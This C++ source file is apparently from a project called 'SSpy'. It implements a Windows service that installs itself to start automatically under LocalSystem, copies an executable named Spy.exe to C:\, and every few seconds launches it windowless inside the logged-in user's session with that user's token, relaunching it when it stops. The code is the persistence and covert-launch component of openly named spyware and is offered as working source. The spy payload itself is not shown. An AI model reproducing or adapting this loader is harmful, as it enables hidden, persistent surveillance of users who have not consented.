#include <Windows.h>
#include <fstream>
#include <Wtsapi32.h>
#include <process.h>

//Program Name
#define SVCNAME TEXT("SSpy")
//Program Description
#define DESC TEXT("Better watch out for this service...")
//Program Version
#define VERSION double(0.32)

SERVICE_STATUS          gSvcStatus;
SERVICE_STATUS_HANDLE   gSvcStatusHandle;
HANDLE                  ghSvcStopEvent = NULL;
int						threadFlag;
//############################################################### Functions
VOID InstallMySpy();
VOID WINAPI SSpyService(DWORD dwArgc, LPTSTR *lpszArgv);
VOID ServiceInit(DWORD dwArgc, LPTSTR *lpszArgv);
VOID ReportMyStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);
VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl);
VOID WINAPI RemoveMySpy();
void __cdecl ServiceWork(void * Args);
bool TrainNewSpy(DWORD id, STARTUPINFO* si, PROCESS_INFORMATION* pi);
void RemoveTheSpy(STARTUPINFO* si, PROCESS_INFORMATION* pi);
DWORD getUserID();

//###############################################################

//
// Purpose: 
//   Entry point for the process
//
// Parameters:
//   argc - number of arguments
//   argv - table of additional arguments
//
// Return value:
//   Status of application as integer
//
int main(int argc, char *argv[])
{
	if (argc > 1)
	{ 
		if (strcmp(argv[1], "install") == 0)
		{
			InstallMySpy();
			return 0;
		}
		if (strcmp(argv[1], "remove") == 0)
		{
			RemoveMySpy();
			return 0;
		}
		if (strcmp(argv[1], "version") == 0)
		{
			printf("SSpy v%.2f !\nYou can find newest version on www.github.com/reqv/sspy\nProgram was created by Wojciech Janeczek.", VERSION);
			return 0;
		}
		if (strcmp(argv[1], "help") == 0 || argc > 2)
		{
			printf("No help for now, sorry :(");
			return 0;
		}
	}
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{ SVCNAME,(LPSERVICE_MAIN_FUNCTION)SSpyService },
		{ NULL, NULL }
	};
	StartServiceCtrlDispatcher(DispatchTable);
	return 0;
}


//####################################################################################################################### (Un)Install

//
// Purpose: 
//   Installs a service in the SCM database
//
// Parameters:
//   None
// 
// Return value:
//   None
//
VOID InstallMySpy()
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;
	TCHAR szPath[MAX_PATH];

	if (!GetModuleFileName(NULL, szPath, MAX_PATH))
	{
		printf("Cannot install service (%d)\n", GetLastError());
		return;
	}

	if (!CopyFile(TEXT(".\\Spy.exe"), TEXT("C:\\Spy.exe"), false))
	{
		printf("Cannot install service (%d)\n", GetLastError());
		return;
	}

	// Get a handle to the SCM database. 
	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);

	if (schSCManager == NULL)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	// Create the service
	schService = CreateService(
		schSCManager,              // SCM database 
		SVCNAME,                   // name of service 
		SVCNAME,                   // service name to display 
		SERVICE_ALL_ACCESS,        // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_AUTO_START,		   // start type 
		SERVICE_ERROR_NORMAL,      // error control type 
		szPath,                    // path to service's binary 
		NULL,                      // no load ordering group 
		NULL,                      // no tag identifier 
		NULL,                      // no dependencies 
		NULL,                      // LocalSystem account 
		NULL);                     // no password 

	if (schService == NULL)
	{
		printf("CreateService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}
	else printf("Service installed successfully\n");

	
	SERVICE_DESCRIPTION desc{ (LPTSTR) DESC };
	ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &desc);
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}


//
// Purpose: 
//   Deletes a service from the SCM database
//
// Parameters:
//   None
// 
// Return value:
//   None
//
VOID WINAPI RemoveMySpy()
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	// Get a handle to the SCM database. 
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	// Get a handle to the service.
	schService = OpenService(schSCManager, SVCNAME, DELETE);

	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	if (!DeleteFile(TEXT("C:\\Spy.exe")))
		printf("Warning! Spy cannot be deleted(%d)\n",GetLastError());

	// Delete the service.
	if (!DeleteService(schService))
	{
		printf("DeleteService failed (%d)\n", GetLastError());
	}
	else printf("Service deleted successfully\n");

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}


//####################################################################################################################### MAIN SERVICE

//
// Purpose: 
//   Entry point for the service
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
// 
// Return value:
//   None.
//
VOID WINAPI SSpyService(DWORD dwArgc, LPTSTR *lpszArgv)
{
	// Register the handler function for the service
	gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME,ServiceCtrlHandler);

	if (!gSvcStatusHandle)
	{
		printf("RegisterServiceCtrlHandler\n");
		return;
	}

	// These SERVICE_STATUS members remain as set here
	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	gSvcStatus.dwServiceSpecificExitCode = 0;

	// Report initial status to the SCM
	ReportMyStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	// Perform service-specific initialization and work.
	ServiceInit(dwArgc, lpszArgv);
}


//
// Purpose: 
//   The service code
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
// 
// Return value:
//   None
//
VOID ServiceInit(DWORD dwArgc, LPTSTR *lpszArgv)
{
	// Create an event. The control handler function, ServiceCtrlHandler,
	// signals this event when it receives the stop control code.

	ghSvcStopEvent = CreateEvent(
		NULL,    // default security attributes
		TRUE,    // manual reset event
		FALSE,   // not signaled
		NULL);   // no name

	if (ghSvcStopEvent == NULL)
	{
		ReportMyStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	// Report running status when initialization is complete.
	ReportMyStatus(SERVICE_RUNNING, NO_ERROR, 0);

	//Work until service stops.
	threadFlag = 1;
	HANDLE hThread = (HANDLE)_beginthread(ServiceWork, 0, NULL);

	while (1)
	{
		// Check whether to stop the service.
		WaitForSingleObject(ghSvcStopEvent, INFINITE);
		threadFlag = 0;
		WaitForSingleObject(hThread, INFINITE);
		ReportMyStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}
}

//####################################################################################################################### Communicate with SCM

//
// Purpose: 
//   Sets the current service status and reports it to the SCM.
//
// Parameters:
//   dwCurrentState - The current state (see SERVICE_STATUS)
//   dwWin32ExitCode - The system error code
//   dwWaitHint - Estimated time for pending operation, 
//     in milliseconds
// 
// Return value:
//   None
//
VOID ReportMyStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;

	// Fill in the SERVICE_STATUS structure.
	gSvcStatus.dwCurrentState = dwCurrentState;
	gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
	gSvcStatus.dwWaitHint = dwWaitHint;

	if (dwCurrentState == SERVICE_START_PENDING)
		gSvcStatus.dwControlsAccepted = 0;
	else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
		gSvcStatus.dwCheckPoint = 0;
	else gSvcStatus.dwCheckPoint = dwCheckPoint++;

	// Report the status of the service to the SCM.
	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}


//
// Purpose: 
//   Called by SCM whenever a control code is sent to the service
//   using the ControlService function.
//
// Parameters:
//   dwCtrl - control code
// 
// Return value:
//   None
//
VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl)
{
	// Handle the requested control code.
	switch (dwCtrl)
	{
	case SERVICE_CONTROL_STOP:
		ReportMyStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

		// Signal the service to stop.
		SetEvent(ghSvcStopEvent);
		ReportMyStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
		return;

	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}

}

//####################################################################################################################### WORK

//
// Purpose: 
//   Work that service will do after initialization.
//
// Parameters:
//   Args - Arguments from parent function
// 
// Return value:
//   None
//
void __cdecl ServiceWork(void * Args)
{
	//Handle for a user Token
	
	DWORD id = 0;
	DWORD lastid = 0;
	DWORD processcheck;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	bool ok = false;
	
	while(threadFlag)
	{
		lastid = getUserID();
		if (ok)
		{
			GetExitCodeProcess(pi.hProcess, &processcheck);
			if (processcheck == PROCESS_TERMINATE || id != lastid)
			{
				RemoveTheSpy(&si, &pi);
				ok = false;
				id = 0;
			}
		}
		else
		{
			if (lastid != 0 && id != lastid)
			{
				id = lastid;
				ok = TrainNewSpy(id, &si, &pi);
			}
		}
		
		Sleep(4000);
	}
	RemoveTheSpy(&si, &pi);
	_endthread();
}

//
// Purpose: 
//   Create the new Spy instance
//
// Parameters:
//   id - current user id
//   si - pointer to STARTUPINFO new structure
//   pi - pointer to PROCESS_INFORMATION new structure
// 
// Return value:
//   A bool value, return true if creation of new process was completed
//
bool TrainNewSpy(DWORD id, STARTUPINFO* si, PROCESS_INFORMATION* pi)
{
	HANDLE pToken;

	//Query a Token
	WTSQueryUserToken(id, &pToken);

	//Create current user process
	bool result = CreateProcessAsUser(
		pToken, TEXT("C:\\Spy.exe"), NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, si, pi);

	CloseHandle(pToken);
	return result;
}

//
// Purpose: 
//   Remove the Spy instance
//
// Parameters:
//   si - pointer to STARTUPINFO structure of a process that will be deleted
//   pi - pointer to PROCESS_INFORMATION structure of a process that will be deleted
// 
// Return value:
//   none
//
void RemoveTheSpy(STARTUPINFO* si, PROCESS_INFORMATION* pi)
{
	if (pi->hProcess != NULL)
		TerminateProcess(pi->hProcess, 0);
	CloseHandle(si->hStdInput);
	CloseHandle(si->hStdError);
	CloseHandle(si->hStdOutput);
	CloseHandle(pi->hProcess);
	CloseHandle(pi->hThread);
}

//####################################################################################################################### Utils

//
// Purpose: 
//   Gets current user ID
//
// Parameters:
//   None
// 
// Return value:
//   Current active user ID as DWORD
//
DWORD getUserID()
{
	DWORD dwSessionId = 0;
	PWTS_SESSION_INFO pSessionInfo = 0;
	DWORD dwCount = 0;

	WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &dwCount);

	int dataSize = sizeof(WTS_SESSION_INFO);

	// look over obtained list in search of the active session
	for (DWORD i = 0; i < dwCount; i++)
	{
		WTS_SESSION_INFO si = pSessionInfo[i];
		if (WTSActive == si.State)
		{
			// If the current session is active – store its ID
			dwSessionId = si.SessionId;
			break;
		}
	}
	WTSFreeMemory(pSessionInfo);
	return dwSessionId;
}
